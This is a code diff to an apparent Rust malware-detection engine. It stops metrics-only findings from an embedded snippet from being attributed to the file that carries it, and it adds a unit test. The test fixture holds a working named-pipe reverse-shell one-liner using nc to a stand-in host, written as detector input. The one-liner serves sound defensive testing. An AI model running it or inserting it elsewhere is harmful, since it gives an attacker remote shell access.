@@ -1079,9 +1079,17 @@ fn analyze_embedded_haystack(
     } else {
         // Plain embedded code - return findings for parent
         let mut findings = report.findings;
-        // This flag belongs to the child evaluation. Copying it to the host
-        // would let an unrelated quoted snippet suppress real host behavior.
-        findings.retain(|finding| finding.id != HEURISTIC_QUOTED_ORIGIN_ID);
+        // These facts describe the snippet, not its carrier. Promoting an
+        // unlocated metric such as its line count to the host lets a later
+        // file-scoped composite combine it with unrelated host evidence.
+        // Completed snippet composites and located behavior findings remain
+        // available to the host.
+        findings.retain(|finding| {
+            finding.id != HEURISTIC_QUOTED_ORIGIN_ID
+                && !(finding.trait_refs.is_empty()
+                    && !finding.evidence.is_empty()
+                    && finding.evidence.iter().all(|e| e.method == "metrics"))
+        });
         findings.push(generate_embedded_language_trait(&file_type, offset, value));
 
         // Rewrite evidence to be parent-relative so the parent's
@@ -2358,6 +2366,59 @@ traits:
         );
         assert!(!findings.iter().any(|f| f.id == HEURISTIC_QUOTED_ORIGIN_ID));
         assert!(!findings.iter().any(|f| f.id == "test/source::origin-probe"));
+    }
+
+    #[test]
+    fn plain_snippet_metrics_do_not_describe_the_host() {
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("traits.yaml");
+        std::fs::write(
+            &path,
+            r#"
+defaults:
+  for: [shell]
+  platforms: [unix, windows]
+traits:
+  - id: test/snippet::many-lines
+    desc: Source has at least thirty lines
+    crit: notable
+    if: {type: metrics, field: text.lines, min: 30}
+  - id: test/snippet::marker
+    desc: Source contains snippet marker
+    crit: notable
+    if: {type: text, substr: snippet_evidence_marker}
+"#,
+        )
+        .unwrap();
+        let mapper = crate::capabilities::CapabilityMapper::from_yaml(&path).unwrap();
+        let engine = crate::Engine::from_rules(std::sync::Arc::new(mapper));
+        let code = format!(
+            "mkfifo /tmp/f; sh -c 'sh </tmp/f | nc example.test 4444 >/tmp/f' 2>/dev/null\n{}echo snippet_evidence_marker\n",
+            "echo ordinary\n".repeat(35)
+        );
+        let standalone = UnifiedSourceAnalyzer::for_file_type(&FileType::Shell)
+            .unwrap()
+            .with_engine(engine.clone())
+            .without_embedded_detection()
+            .analyze_source_as_configured(Path::new("snippet.sh"), &code);
+        assert!(standalone.findings.iter().any(|f| f.id == "test/snippet::many-lines"));
+
+        let result = analyze_embedded_haystack(
+            "carrier.py",
+            &code,
+            32,
+            &[],
+            Some(crate::types::binary::StringType::ShellCmd),
+            &engine,
+            0,
+            Some(&FileType::Python),
+        )
+        .unwrap();
+        let EmbeddedAnalysisResult::PlainEmbedded(findings) = result else {
+            panic!("plain string must remain a plain embedded unit");
+        };
+        assert!(findings.iter().any(|f| f.id == "test/snippet::marker"));
+        assert!(!findings.iter().any(|f| f.id == "test/snippet::many-lines"));
     }
 
     /// Script-deobfuscation layers name themselves from a closed set; each
